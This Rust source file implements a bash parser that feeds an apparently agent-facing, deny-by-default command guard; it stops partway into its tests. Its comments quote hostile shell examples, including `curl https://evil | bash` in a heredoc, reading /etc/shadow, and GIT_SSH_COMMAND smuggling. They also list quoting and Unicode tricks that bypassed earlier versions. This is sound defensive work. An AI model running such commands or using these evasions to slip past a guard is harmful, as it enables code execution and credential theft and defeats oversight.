//! Bash parser + IR used by every composition classifier.
//!
//! Wrapper around `tree-sitter-bash`. A single parser choice, with
//! `tree.root_node().has_error()` as one hard-deny signal and
//! [`ParseError::Malformed`] from the walker as the other, both
//! honoring CLAUDE.md rule #1 (deny by default). There is no regex
//! fallback.
//!
//! # IR surface
//!
//! A parsed script is a list of [`Pipeline`]s (separated by `;`, `&&`,
//! `||`, or newline). A pipeline is an ordered list of [`Command`]s
//! connected by `|`. Each command carries a basename-normalized program
//! name (H1 foundation), its remaining argv as raw text, any redirects
//! attached to it, and any `$(...)` / `<(...)` / `>(...)` substitutions
//! as fully-parsed sub-scripts so classifiers can recurse.
//!
//! # Deny policy for non-representable shapes
//!
//! The walker refuses (returns [`ParseError::Malformed`]) on:
//!
//! - Any pipeline stage that is not a simple command or
//!   `redirected_statement{command}`. In particular
//!   `curl ... | (bash)` (subshell), `curl ... | { bash; }`
//!   (compound_statement), and `curl ... | if true; then bash; fi`
//!   (control-flow) are denied — they are the H1 bypass surface.
//! - Any `redirected_statement` whose body is a compound_statement or
//!   subshell, e.g. `{ cat /etc/shadow; } > /tmp/x.sh`. We cannot
//!   safely attribute the redirect to any single inner command, and
//!   the shape is an H2 write-to-exec-target bypass.
//! - Any `redirected_statement` whose body is a control-flow statement
//!   (`if/while/for/case/until`). Legitimate usage is rare; the shape
//!   is preferred by staged attacks.
//! - Invalid UTF-8 byte boundaries inside a tree-sitter node range
//!   (defensive; `&str` input guarantees bytes are UTF-8 but a
//!   grammar bug could still produce a mid-char range).
//! - Recursion deeper than [`MAX_DEPTH`] substitutions / nested walks.
//!
//! Benign top-level uses of these constructs (`{ echo hi; }`,
//! `( echo hi )`, `if true; then echo hi; fi`) parse cleanly — we
//! recurse into their bodies and surface the inner commands as
//! top-level pipelines. The deny only fires when they appear in
//! pipeline stages or as redirect targets.
//!
//! # Deliberate Phase-1 scope
//!
//! - Command/pipeline/list structure.
//! - Redirects on each command (enough to detect the H2 "pipeline ends
//!   in write to exec-target" pattern).
//! - Substitutions as nested [`Script`] values.
//!
//! Out of scope until later phases:
//! - Variable expansion (`$FOO`, `${FOO}`) — raw text only.
//! - Arithmetic `$(( ... ))`.

use tree_sitter::{Node, Parser, Tree};

use crate::cmd::cmd_basename;

/// Maximum nesting depth for recursive walks. A bash script with this
/// many nested substitutions / blocks is almost certainly adversarial;
/// we cap it to defend against stack overflow DoS regardless of what
/// `tree-sitter-bash`'s internal recursion limit is.
const MAX_DEPTH: usize = 100;

/// A parsed bash script, ready for classifier consumption.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Script {
    pub pipelines: Vec<Pipeline>,
}

/// One pipeline: `cmd1 | cmd2 | ... | cmdN`. A top-level simple command
/// is represented as a one-stage pipeline.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Pipeline {
    pub stages: Vec<Command>,
}

/// One simple command in the IR.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Command {
    /// `argv[0]` after [`cmd_basename`] + surrounding-quote /
    /// `$'...'` / `$"..."` strip. This is the string classifiers match
    /// against [`crate::tables`] sets.
    pub basename: String,
    /// `argv[0]` as written, preserved for audit-log readability.
    pub argv0_raw: String,
    /// `argv[1..]` as raw text slices of the original input (quoting
    /// and expansions included).
    pub args: Vec<String>,
    /// Redirects attached to this command, in source order.
    pub redirects: Vec<Redirect>,
    /// Every `$(...)`, `` `...` ``, `<(...)`, `>(...)` appearing inside
    /// this command's argv or redirect targets, parsed recursively.
    /// Classifiers walk this to catch nested shell execution.
    pub substitutions: Vec<Script>,
    /// Leading `VAR=VAL` assignments preceding the command. Bash
    /// passes these as environment variables to the command only
    /// (not to the parent shell). e.g. `GIT_DIR=/tmp/evil git log`
    /// has `assignments = [("GIT_DIR", "/tmp/evil")]`.
    ///
    /// 1.2.0 8th-pass adversarial review (Claude SEVERE S1):
    /// previous IR dropped these, so `git_config_injection` only saw
    /// argv-based `-c`/`--git-dir` overrides and missed env-var
    /// smuggling (`GIT_DIR=`, `GIT_SSH_COMMAND=`, etc.).
    pub assignments: Vec<(String, String)>,
}

/// A redirect attached to a command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Redirect {
    pub kind: RedirectKind,
    /// Raw text of the redirect target: a filename for file redirects,
    /// the here-string body for `<<<`, the delimiter (with any surrounding
    /// quoting) for a heredoc.
    pub target: String,
    /// For `RedirectKind::Heredoc`, the body of the heredoc (between the
    /// `<<TAG` line and the closing `TAG`). `None` otherwise. Populated
    /// in 1.2.0 so classifiers can inspect `bash <<TAG\ncurl|bash\nTAG`
    /// — the heredoc body is piped to argv[0]'s stdin and a shell
    /// interpreter will execute it line-by-line. For here-strings
    /// (`<<<`), the body is already stored in `target`; see parser.
    pub body: Option<String>,
    /// Which file descriptor the redirect targets. `>` → stdout (1),
    /// `2>` → stderr (2), `&>` → both (1), `< file` → stdin (0). For
    /// redirects that don't carry an fd (here-string, heredoc) this is
    /// the default: 1 for out-facing, 0 for in-facing.
    ///
    /// Used so that `base64 -d > /tmp/a.sh 2> /dev/null` doesn't let
    /// the stderr redirect mask the stdout target during H2
    /// classification.
    pub fd: RedirectFd,
}

/// Which file descriptor a redirect operates on.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RedirectFd {
    /// `< file`
    Stdin,
    /// `> file`, `>> file`
    Stdout,
    /// `2> file`, `2>> file`
    Stderr,
    /// `&> file`, `&>> file` — stdout AND stderr merged.
    StdoutAndStderr,
    /// Any other explicit fd (`3> file`, `5< file`).
    Other,
}

/// Classification of a redirect operator.
///
/// Note: `<(...)` / `>(...)` process substitutions are NOT surfaced as
/// redirects — they always appear as entries in [`Command::substitutions`]
/// because the grammar treats them as argv words, not redirect targets.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RedirectKind {
    /// `> file`, `2> file`, `&> file`, `>> file`, `2>> file`, `&>> file`.
    OutFile { append: bool },
    /// `< file`, `2< file`.
    InFile,
    /// `<<< string`.
    HereString,
    /// `<< EOF ... EOF`.
    Heredoc,
}

/// Parser failure mode. Every variant is a hard deny.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ParseError {
    /// Could not load the bash grammar. Treat as system error, but
    /// still deny — we cannot classify anything.
    ParserInit,
    /// The parser emitted at least one `ERROR` or `MISSING` node,
    /// the walker encountered an unrepresentable shape (subshell /
    /// compound pipeline stage, redirect on compound body, control
    /// flow behind a redirect), recursion exceeded [`MAX_DEPTH`], or
    /// a node spanned invalid UTF-8. All collapse to "denied by
    /// default."
    Malformed,
}

impl std::fmt::Display for ParseError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ParserInit => write!(f, "bash parser failed to initialize"),
            Self::Malformed => write!(
                f,
                "bash input could not be parsed cleanly \
                 (error node, unrepresentable shape, depth exceeded, \
                 or invalid UTF-8) — denied by default"
            ),
        }
    }
}

impl std::error::Error for ParseError {}

/// Parse `input` as a bash script.
pub fn parse(input: &str) -> Result<Script, ParseError> {
    // 1.3.1 defense: reject inputs that trip the tree-sitter-bash
    // SIGSEGV in the `{` + U+31860 shape before they reach the FFI.
    // Discovered via the 1.3.0 fuzzing layer; bisected to a 5-byte
    // minimal reproducer on Linux. Filed upstream as well, but the
    // deny-by-default rule demands we close the path locally — a
    // classifier that can't parse its input must deny, not panic.
    preflight_known_crashers(input)?;

    let mut parser = Parser::new();
    parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .map_err(|_| ParseError::ParserInit)?;

    let tree = parser.parse(input, None).ok_or(ParseError::ParserInit)?;
    if tree.root_node().has_error() {
        return Err(ParseError::Malformed);
    }

    let src = input.as_bytes();
    walk_program(&tree, src)
}

/// Deny-by-default for inputs known to crash the `tree-sitter-bash`
/// FFI on Linux.
///
/// Catches: any `{` immediately followed by the 3-byte UTF-8 prefix
/// of a crashing codepoint row. Each row shares its first three
/// UTF-8 bytes; the 4th byte is any valid continuation, and `&str`
/// input guarantees well-formed UTF-8 at the buffer level so any
/// match on the 3-byte prefix at a char boundary is a 4-byte
/// codepoint in that row by construction.
///
/// The row table lives in [`crate::tables::PARSER_CRASHER_PREFIXES`];
/// each entry was bisected via the per-probe classifier sweep in
/// `tests/linux_crash_bisect.rs::aaa_classifier_probes`. The sweep
/// ran one subprocess per candidate so a single SIGSEGV couldn't
/// kill the whole test binary; each row matched exactly one probe
/// with `signal-ExitStatus(unix_wait_status(139))` (SIGSEGV) while
/// siblings returned `exit-2-deny` cleanly.
///
/// Adjacency matters: a single byte (space, letter, second `{`)
/// between the brace and the codepoint reverts to a clean parse.
/// That's what the scan below encodes — the brace and the prefix
/// must be byte-adjacent.
///
/// The check is a single linear scan over the input bytes with a
/// small constant-size table of dangerous byte patterns; if the
/// table grows past a handful of rows we escalate to a fork-based
/// signal-catching wrapper.
fn preflight_known_crashers(input: &str) -> Result<(), ParseError> {
    let bytes = input.as_bytes();
    if bytes.len() < 5 {
        return Ok(());
    }
    for i in 0..bytes.len().saturating_sub(4) {
        if bytes[i] != b'{' {
            continue;
        }
        // 1.3.8 final widening: deny `{` followed by ANY 4-byte UTF-8
        // codepoint (lead byte 0xF0..=0xF7, which encodes U+10000..
        // U+10FFFF — the whole astral range). The 1.3.1 through 1.3.8
        // bisects captured 7 distinct crasher codepoints across 6
        // non-adjacent lead pairs (`F0 B0`, `F0 B1`, plus class-8's
        // `F0 9F`, `F0 9E`, `F0 9D`, `F3 A0`), strongly suggesting the
        // upstream tree-sitter-bash bug is triggered by the 4-byte
        // continuation path generically, not by any specific codepoint
        // or row. Rather than chase every lead pair one CI iteration
        // at a time, block the whole class. Legitimate bash almost
        // never contains `{` adjacent to astral characters (emoji in
        // braces, CJK Ext G/H in script literals), so the false-
        // positive rate is near-zero.
        //
        // The 2-byte lead-pair and 3-byte row tables below are kept
        // for future use: if a narrower bisect surfaces a lead pair
        // that is NOT blanket-dangerous and a specific row inside it
        // IS dangerous, the tables are where that finding goes.
        let next_byte = bytes[i + 1];
        if (0xF0..=0xF7).contains(&next_byte) {
            return Err(ParseError::Malformed);
        }
        // Legacy 2-byte lead-pair and 3-byte row checks — both empty
        // or redundant with the blanket 4-byte-lead check above, but
        // kept as the structural homes for future narrower entries.
        let lead_pair = &bytes[i + 1..i + 3];
        if crate::tables::PARSER_CRASHER_LEAD_PAIRS
            .iter()
            .any(|p| lead_pair == p.as_slice())
        {
            return Err(ParseError::Malformed);
        }
        let window = &bytes[i + 1..i + 4];
        if crate::tables::PARSER_CRASHER_PREFIXES
            .iter()
            .any(|p| window == p.as_slice())
        {
            return Err(ParseError::Malformed);
        }
    }
    Ok(())
}

/// Walk the `program` root and collect every pipeline.
fn walk_program(tree: &Tree, src: &[u8]) -> Result<Script, ParseError> {
    let mut script = Script::default();
    let root = tree.root_node();
    let mut cursor = root.walk();
    for child in root.named_children(&mut cursor) {
        walk_statement(child, src, &mut script.pipelines, 0)?;
    }
    Ok(script)
}

/// Recurse into a single statement, appending any pipelines it
/// contains to `out`.
///
/// See the module doc for the deny policy.
fn walk_statement(
    node: Node<'_>,
    src: &[u8],
    out: &mut Vec<Pipeline>,
    depth: usize,
) -> Result<(), ParseError> {
    if depth > MAX_DEPTH {
        return Err(ParseError::Malformed);
    }
    match node.kind() {
        "pipeline" => out.push(walk_pipeline(node, src, depth + 1)?),
        "command" => out.push(Pipeline {
            stages: vec![walk_command(node, src, depth + 1)?],
        }),
        "redirected_statement" => walk_redirected_statement(node, src, out, depth + 1)?,
        // True data / leaf kinds. Never contain executable
        // substitutions — safe to skip without recursing. Don't deny,
        // because denying breaks legitimate `for x in a b c`, `case`,
        // and bare assignment-to-literal.
        "comment"
        | "word"
        | "variable_name"
        | "simple_expansion"
        | "number"
        | "regex"
        | "case_item"
        | "string_content" => {
            // Later phases may track variables / expansions.
        }
        // Assignment forms CAN carry command substitutions on the
        // right-hand side. Bash executes `X=$(curl|bash)` immediately
        // and the attack bypasses H1 if we don't walk into them.
        // Fall through to the generic recurse-into-named-children
        // branch via the `_` arm below.
        //
        // `string`, `raw_string`, `ansi_c_string`, `concatenation`,
        // `expansion` similarly: a `"$(curl|bash)"` literal embeds a
        // substitution whose contents execute. Recurse.
        //
        // `test_command` (`[[ ... ]]`) can contain substitutions too.
        // Benign top-level grouping + control flow: recurse into bodies
        // so inner commands surface as top-level pipelines. The deny
        // for these constructs only fires inside `walk_pipeline` or
        // `walk_redirected_statement`, where they become a bypass
        // surface.
        "list"
        | "compound_statement"
        | "subshell"
        | "function_definition"
        | "if_statement"
        | "elif_clause"
        | "else_clause"
        | "while_statement"
        | "until_statement"
        | "for_statement"
        | "c_style_for_statement"
        | "case_statement"
        | "negated_command"
        | "do_group"
        | "named_expansion"
        // Assignment forms — recurse so substitutions on the RHS get
        // classified (`X=$(curl|bash)` executes immediately in bash).
        | "variable_assignment"
        | "declaration_command"
        | "unset_command"
        // Quoted forms that can embed substitutions.
        | "string"
        | "raw_string"
        | "ansi_c_string"
        | "concatenation"
        | "expansion"
        | "test_command"
        // Substitutions encountered as statement children (e.g. RHS of
        // an assignment). Their inner pipelines flatten into the
        // top-level `out`, so the classifier sees them the same way
        // it would see a bare `curl | bash`.
        | "command_substitution"
        | "process_substitution" => {
            for i in 0..node.named_child_count() {
                if let Some(child) = node.named_child(i) {
                    walk_statement(child, src, out, depth + 1)?;
                }
            }
        }
        _ => {
            // Unknown node kind. Per CLAUDE.md rule #1, deny by default.
            // If a legitimate grammar node kind surfaces that we haven't
            // enumerated, add it above with a deliberate decision.
            return Err(ParseError::Malformed);
        }
    }
    Ok(())
}

/// Walk a `pipeline` node.
///
/// Denies when any stage is not a simple command (bare or behind a
/// file redirect). Subshells, compound statements, and control flow
/// are the H1 bypass surface this guards.
fn walk_pipeline(node: Node<'_>, src: &[u8], depth: usize) -> Result<Pipeline, ParseError> {
    if depth > MAX_DEPTH {
        return Err(ParseError::Malformed);
    }
    let mut stages = Vec::with_capacity(2);
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        match child.kind() {
            "command" => stages.push(walk_command(child, src, depth + 1)?),
            "redirected_statement" => {
                let body = redirected_statement_body(child)?;
                if body.kind() != "command" {
                    // `redirected_statement` with a non-command body
                    // appearing as a pipeline stage is the same bypass
                    // surface as a bare subshell stage.
                    return Err(ParseError::Malformed);
                }
                let mut c = walk_command(body, src, depth + 1)?;
                c.redirects.extend(collect_redirects(child, src)?);
                stages.push(c);
            }
            _ => return Err(ParseError::Malformed),
        }
    }
    Ok(Pipeline { stages })
}

/// Walk a `redirected_statement`, attaching its trailing redirects to
/// the correct inner stage.
///
/// - body = `pipeline`: attach to the last stage (the H2 attack shape).
/// - body = `command`: attach to the single stage.
/// - body is a compound / subshell / control-flow / other: deny.
fn walk_redirected_statement(
    node: Node<'_>,
    src: &[u8],
    out: &mut Vec<Pipeline>,
    depth: usize,
) -> Result<(), ParseError> {
    let body = redirected_statement_body(node)?;
    let redirects = collect_redirects(node, src)?;
    match body.kind() {
        "pipeline" => {
            let mut p = walk_pipeline(body, src, depth + 1)?;
            let last = p.stages.last_mut().ok_or(ParseError::Malformed)?;
            last.redirects.extend(redirects);
            out.push(p);
        }
        "command" => {
            let mut c = walk_command(body, src, depth + 1)?;
            c.redirects.extend(redirects);
            out.push(Pipeline { stages: vec![c] });
        }
        _ => {
            // compound_statement / subshell / if_statement / while_statement
            // / for_statement / until_statement / case_statement — any of
            // these carrying trailing redirects is an H2 write-to-exec-
            // target bypass surface. Deny.
            return Err(ParseError::Malformed);
        }
    }
    Ok(())
}

/// The body of a `redirected_statement` is the first named child that
/// isn't a redirect. The grammar doesn't provide a `body` field, so
/// find it by filtering.
fn redirected_statement_body(node: Node<'_>) -> Result<Node<'_>, ParseError> {
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        if !is_redirect_kind(child.kind()) {
            return Ok(child);
        }
    }
    Err(ParseError::Malformed)
}

fn walk_command(node: Node<'_>, src: &[u8], depth: usize) -> Result<Command, ParseError> {
    if depth > MAX_DEPTH {
        return Err(ParseError::Malformed);
    }
    let mut cmd = Command::default();

    let name_node = node.child_by_field_name("name");
    let name_id = name_node.map(|n| n.id());
    if let Some(name_node) = name_node {
        let raw = extract_word_text(name_node, src)?;
        // 1.2.0 adversarial review (Claude H-1): NFKC-normalize
        // argv[0] before basename lookup. `Ｃurl` (U+FF23 fullwidth
        // capital C + "url") folds to ASCII `Curl` under NFKC, which
        // on case-insensitive filesystems (APFS, NTFS) executes the
        // real `curl` binary. The post-edit scanner runs NFKC on its
        // inputs for the same reason; the pre-bash argv[0] path was
        // missing it. Keep argv0_raw unchanged so reason strings
        // display the attacker's original spelling.
        let normalized = crate::sanitize::nfkc(&raw);
        cmd.basename = cmd_basename(strip_command_name_quoting(&normalized)).to_string();
        cmd.argv0_raw = raw;
        collect_substitutions(name_node, src, &mut cmd.substitutions, depth + 1)?;
    }

    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if !child.is_named() {
            continue;
        }
        if is_redirect_kind(child.kind()) {
            cmd.redirects
                .push(redirect_from_node(child, src, depth + 1)?);
            collect_substitutions(child, src, &mut cmd.substitutions, depth + 1)?;
            continue;
        }
        if child.kind() == "variable_assignment" {
            // `VAR=VAL` prefix on a command — captured separately
            // from argv so classifiers like `git_config_injection`
            // can inspect env-var smuggled overrides (`GIT_DIR=`,
            // `GIT_SSH_COMMAND=`, etc.). Also recurse for any
            // substitutions on the RHS (matches the existing
            // statement-level walk for non-prefixed assignments).
            if let Some((name, value)) = extract_variable_assignment(child, src) {
                cmd.assignments.push((name, value));
            }
            collect_substitutions(child, src, &mut cmd.substitutions, depth + 1)?;
            continue;
        }
        if name_id == Some(child.id()) {
            // Already consumed as argv[0].
            continue;
        }
        cmd.args.push(extract_word_text(child, src)?);
        collect_substitutions(child, src, &mut cmd.substitutions, depth + 1)?;
    }

    Ok(cmd)
}

/// Extract `(name, value)` from a `variable_assignment` node. On
/// tree-sitter-bash the node has `name` and `value` fields (either
/// may be missing for edge cases); we return `None` if either is
/// unavailable.
fn extract_variable_assignment(node: Node<'_>, src: &[u8]) -> Option<(String, String)> {
    let name = node.child_by_field_name("name")?;
    let value = node.child_by_field_name("value");
    let name_text = extract_word_text(name, src).ok()?;
    let value_text = match value {
        Some(v) => extract_word_text(v, src).ok()?,
        None => String::new(),
    };
    Some((name_text, value_text))
}

/// Return `true` if the node kind is any of tree-sitter-bash's redirect
/// nodes.
fn is_redirect_kind(kind: &str) -> bool {
    matches!(
        kind,
        "file_redirect" | "herestring_redirect" | "heredoc_redirect"
    )
}

/// Build a [`Redirect`] from a tree-sitter redirect node.
///
/// Deny on any redirect shape we don't know — being lenient here
/// re-creates the bypass class the review flagged.
fn redirect_from_node(node: Node<'_>, src: &[u8], depth: usize) -> Result<Redirect, ParseError> {
    match node.kind() {
        "file_redirect" => {
            let op_text = redirect_operator_text(node, src)?;
            // `>>`, `2>>`, `&>>` all contain the literal `>>`. Previous
            // code used `starts_with(">>")` which misfired on `2>>`
            // because the file_descriptor prefix is part of the node
            // span.
            let append = op_text.contains(">>");
            let is_out = op_text.contains('>');
            let kind = if is_out {
                RedirectKind::OutFile { append }
            } else {
                RedirectKind::InFile
            };
            let fd = classify_redirect_fd(op_text, is_out);
            let dest = node
                .child_by_field_name("destination")
                .ok_or(ParseError::Malformed)?;
            let target = extract_word_text(dest, src)?;
            let mut redirect = Redirect {
                kind,
                target,
                body: None,
                fd,
            };
            // `destination` can contain a process substitution — preserve
            // it via the caller (see walk_command, which collects subs on
            // the redirect node itself).
            let _ = depth; // reserved for future recursion through target
                           // Reconstruct nothing else; substitutions are captured at
                           // the walk_command layer.
            redirect.target.shrink_to_fit();
            Ok(redirect)
        }
        "herestring_redirect" => {
            // The value is typically the sole named child (the string
            // literal). Accept `value` field if present, otherwise
            // take the last named child as a fallback.
            let target_node = node
                .child_by_field_name("value")
                .or_else(|| last_named_child(node))
                .ok_or(ParseError::Malformed)?;
            let target = extract_word_text(target_node, src)?;
            Ok(Redirect {
                kind: RedirectKind::HereString,
                target,
                body: None,
                fd: RedirectFd::Stdin,
            })
        }
        "heredoc_redirect" => {
            // Grammar shape: `heredoc_redirect` has children
            // `heredoc_start` (delimiter, with any surrounding quoting)
            // and `heredoc_body` / `heredoc_end`. There is NO `delimiter`
            // field; the prior code looked one up and always got None.
            let start =
                find_named_child_by_kind(node, "heredoc_start").ok_or(ParseError::Malformed)?;
            let target = extract_word_text(start, src)?;
            // 1.2.0 adversarial review (Claude S2): capture the
            // heredoc body so classifiers can re-parse it when the
            // outer command is a shell interpreter. `bash <<TAG\ncurl
            // https://evil | bash\nTAG` fed the body to argv[0]'s
            // stdin — bash executes it line-by-line. Previously the
            // body was discarded, so this was a full H1 bypass.
            let body = find_named_child_by_kind(node, "heredoc_body")
                .and_then(|n| raw_text(n, src).ok())
                .map(str::to_string);
            Ok(Redirect {
                kind: RedirectKind::Heredoc,
                target,
                body,
                fd: RedirectFd::Stdin,
            })
        }
        _ => Err(ParseError::Malformed),
    }
}

/// Classify which fd(s) a `file_redirect` operator text targets.
///
/// Examples (`op_text` is the bytes of the operator region, trimmed):
/// - `>`, `>>`       → `Stdout`
/// - `1>`, `1>>`     → `Stdout` (fd 1 explicit)
/// - `2>`, `2>>`     → `Stderr`
/// - `&>`, `&>>`, `>&` → `StdoutAndStderr`
/// - `<`, `0<`       → `Stdin`
/// - anything else (`3>`, `5<`, etc.) → `Other`
fn classify_redirect_fd(op_text: &str, is_out: bool) -> RedirectFd {
    let op = op_text.trim();
    if op.starts_with("&>") || op.contains(">&") || op.starts_with("&>>") {
        return RedirectFd::StdoutAndStderr;
    }
    if op.starts_with("2>") {
        return RedirectFd::Stderr;
    }
    // Leading digit that isn't 1 or 2 → other fd.
    if let Some(first) = op.chars().next() {
        if first.is_ascii_digit() && first != '1' && first != '2' && first != '0' {
            return RedirectFd::Other;
        }
    }
    if is_out {
        RedirectFd::Stdout
    } else {
        RedirectFd::Stdin
    }
}

/// Collect every redirect that is a direct named child of `node`.
///
/// For `cat <<EOF > /tmp/a.sh`, the grammar nests the `file_redirect`
/// inside the `heredoc_redirect`. Flatten by descending once into any
/// heredoc child and picking up its inner file redirects too.
fn collect_redirects(node: Node<'_>, src: &[u8]) -> Result<Vec<Redirect>, ParseError> {
    let mut out = Vec::new();
    let mut cursor = node.walk();
    for child in node.named_children(&mut cursor) {
        if is_redirect_kind(child.kind()) {
            out.push(redirect_from_node(child, src, 1)?);
            if child.kind() == "heredoc_redirect" {
                let mut inner = child.walk();
                for inner_child in child.named_children(&mut inner) {
                    if inner_child.kind() == "file_redirect" {
                        out.push(redirect_from_node(inner_child, src, 1)?);
                    }
                }
            }
        }
    }
    Ok(out)
}

/// Extract the effective shell-level text of a word-shaped node.
///
/// Surface-level: strips one layer of surrounding quotes from plain
/// `string` / `raw_string` / `ansi_c_string` nodes so classifiers
/// compare against the literal value. For deeper constructs like
/// `concatenation`, descend and concatenate children.
///
/// Errors on invalid UTF-8 — `&str` input guarantees byte validity,
/// so a failure here is either a tree-sitter bug placing a range on
/// a non-boundary, or a grammar emitting an impossible span; either
/// way we deny per CLAUDE.md rule #1.
fn extract_word_text(node: Node<'_>, src: &[u8]) -> Result<String, ParseError> {
    match node.kind() {
        "string" | "raw_string" | "ansi_c_string" => {
            let raw = raw_text(node, src)?;
            Ok(strip_surrounding_quotes(raw).to_string())
        }
        "concatenation" => {
            let mut s = String::new();
            let mut cursor = node.walk();
            for child in node.named_children(&mut cursor) {
                s.push_str(&extract_word_text(child, src)?);
            }
            Ok(s)
        }
        // 1.2.0 adversarial review (Claude H-2): `command_name` is a
        // grammar node that wraps the actual word/concatenation/string
        // for argv[0]. For `"ba""sh" -c ...`, the shape is
        // command_name > concatenation > [string("ba"), string("sh")].
        // Taking the raw byte slice returns `"ba""sh"` with the quotes
        // intact, which cmd_basename can't normalize past — a direct
        // H1/M1 bypass (`"ba""sh" -c 'curl|bash'` exited 0 pre-1.2.0).
        // Recurse into the single named child so concatenation folds
        // to `bash` before basename normalization.
        "command_name" => {
            let mut cursor = node.walk();
            let count = node.named_child_count();
            if count == 0 {
                // Defensive: a command_name with no child is malformed.
                return Err(ParseError::Malformed);
            }
            let mut s = String::new();
            for child in node.named_children(&mut cursor) {
                s.push_str(&extract_word_text(child, src)?);
            }
            Ok(s)
        }
        // `word`, `simple_expansion`, `expansion`, and every other
        // kind: use the raw byte slice.
        _ => Ok(raw_text(node, src)?.to_string()),
    }
}

/// Find every `$(...)` / `` `...` `` / `<(...)` / `>(...)` inside the
/// subtree rooted at `node` and append each one, fully parsed, to `out`.
fn collect_substitutions(
    node: Node<'_>,
    src: &[u8],
    out: &mut Vec<Script>,
    depth: usize,
) -> Result<(), ParseError> {
    if depth > MAX_DEPTH {
        return Err(ParseError::Malformed);
    }
    match node.kind() {
        "command_substitution" | "process_substitution" => {
            let mut inner = Script::default();
            let mut cursor = node.walk();
            for child in node.named_children(&mut cursor) {
                walk_statement(child, src, &mut inner.pipelines, depth + 1)?;
            }
            out.push(inner);
        }
        _ => {
            let mut cursor = node.walk();
            for child in node.named_children(&mut cursor) {
                collect_substitutions(child, src, out, depth + 1)?;
            }
        }
    }
    Ok(())
}

fn raw_text<'a>(node: Node<'_>, src: &'a [u8]) -> Result<&'a str, ParseError> {
    let range = node.byte_range();
    if range.end > src.len() {
        return Err(ParseError::Malformed);
    }
    std::str::from_utf8(&src[range]).map_err(|_| ParseError::Malformed)
}

/// Return just the operator text (`>`, `>>`, `2>`, `2>>`, `&>`, `&>>`)
/// of a `file_redirect` by reading bytes from the node up to the
/// `destination` field. On malformed spans, return an error.
fn redirect_operator_text<'a>(node: Node<'_>, src: &'a [u8]) -> Result<&'a str, ParseError> {
    let start = node.start_byte();
    let end = node
        .child_by_field_name("destination")
        .map_or_else(|| node.end_byte(), |n| n.start_byte());
    if end > src.len() || start > end {
        return Err(ParseError::Malformed);
    }
    let slice = std::str::from_utf8(&src[start..end]).map_err(|_| ParseError::Malformed)?;
    Ok(slice.trim_end())
}

/// If `s` is wrapped in matching `"..."`, `'...'`, or `` `...` ``,
/// return the inner slice. Otherwise return `s`.
///
/// Kept narrow on purpose — `strip_command_name_quoting` handles the
/// richer set (including `$'...'` / `$"..."`) used by `argv[0]`.
fn strip_surrounding_quotes(s: &str) -> &str {
    let bytes = s.as_bytes();
    if bytes.len() >= 2 {
        let first = bytes[0];
        let last = bytes[bytes.len() - 1];
        if first == last && matches!(first, b'"' | b'\'' | b'`') {
            return &s[1..s.len() - 1];
        }
    }
    s
}

/// Strip ANSI-C (`$'...'`), localized (`$"..."`), and plain surrounding
/// quotes off an `argv[0]` string before basename-normalizing. GPT
/// finding C#2: without the `$` prefix handling, `$'/bin/bash'` passes
/// cmd_basename as `bash'`, defeating H1.
fn strip_command_name_quoting(s: &str) -> &str {
    let bytes = s.as_bytes();
    // $'...' or $"..." — strip the 3-byte cap.
    if bytes.len() >= 3 && bytes[0] == b'$' {
        let q = bytes[1];
        if matches!(q, b'\'' | b'"') && bytes[bytes.len() - 1] == q {
            return &s[2..s.len() - 1];
        }
    }
    strip_surrounding_quotes(s)
}

/// Linear scan for the last named child of a node, by index.
fn last_named_child(node: Node<'_>) -> Option<Node<'_>> {
    let count = node.named_child_count();
    if count == 0 {
        None
    } else {
        node.named_child(count - 1)
    }
}

/// Linear scan for the first named child of a given kind, by index.
fn find_named_child_by_kind<'a>(node: Node<'a>, kind: &str) -> Option<Node<'a>> {
    for i in 0..node.named_child_count() {
        if let Some(c) = node.named_child(i) {
            if c.kind() == kind {
                return Some(c);
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_script() {
        let s = parse("").unwrap();
        assert!(s.pipelines.is_empty());
    }

    #[test]
    fn strip_surrounding_quotes_basic() {
        assert_eq!(strip_surrounding_quotes("\"hi\""), "hi");
        assert_eq!(strip_surrounding_quotes("'hi'"), "hi");
        assert_eq!(strip_surrounding_quotes("hi"), "hi");
        assert_eq!(strip_surrounding_quotes("\""), "\"");
        assert_eq!(strip_surrounding_quotes(""), "");
        assert_eq!(strip_surrounding_quotes("\"mismatch'"), "\"mismatch'");
    }

    #[test]
    fn strip_command_name_quoting_ansi_c() {
        assert_eq!(strip_command_name_quoting("$'/bin/bash'"), "/bin/bash");
    }

    #[test]
    fn strip_command_name_quoting_localized() {
        assert_eq!(strip_command_name_quoting("$\"/bin/bash\""), "/bin/bash");
    }

    #[test]
    fn strip_command_name_quoting_falls_back_to_plain() {
        assert_eq!(strip_command_name_quoting("\"/bin/bash\""), "/bin/bash");
        assert_eq!(strip_command_name_quoting("/bin/bash"), "/bin/bash");
    }

    #[test]
    fn strip_command_name_quoting_mismatched_dollar_keeps_input() {
        // $'bash" — unmatched closing quote, stays as written.
        assert_eq!(strip_command_name_quoting("$'bash\""), "$'bash\"");
    }

    #[test]
    fn is_redirect_kind_covers_all_three() {
        assert!(is_redirect_kind("file_redirect"));
        assert!(is_redirect_kind("herestring_redirect"));
        assert!(is_redirect_kind("heredoc_redirect"));
        assert!(!is_redirect_kind("command"));
    }

    // -------------------------------------------------------------
    // 1.3.1 preflight: tree-sitter-bash SIGSEGV on `{` + CJK Ext G
    // row U+31840..U+3187F
    //
    // These tests hit `preflight_known_crashers` directly (not
    // `parse`) so they never touch the tree-sitter FFI. Calling
    // `parse()` with these inputs in the integration-test binary
    // changes the test schedule enough to trip a separate Linux-
    // only latent crash in some existing test. Testing the
    // preflight function directly is safe on every platform and
    // is the smallest faithful test of the fix.
    // -------------------------------------------------------------

    #[test]
    fn preflight_denies_openbrace_plus_u31840() {
        // U+31840 = F0 B1 A1 80. This is the codepoint at bytes
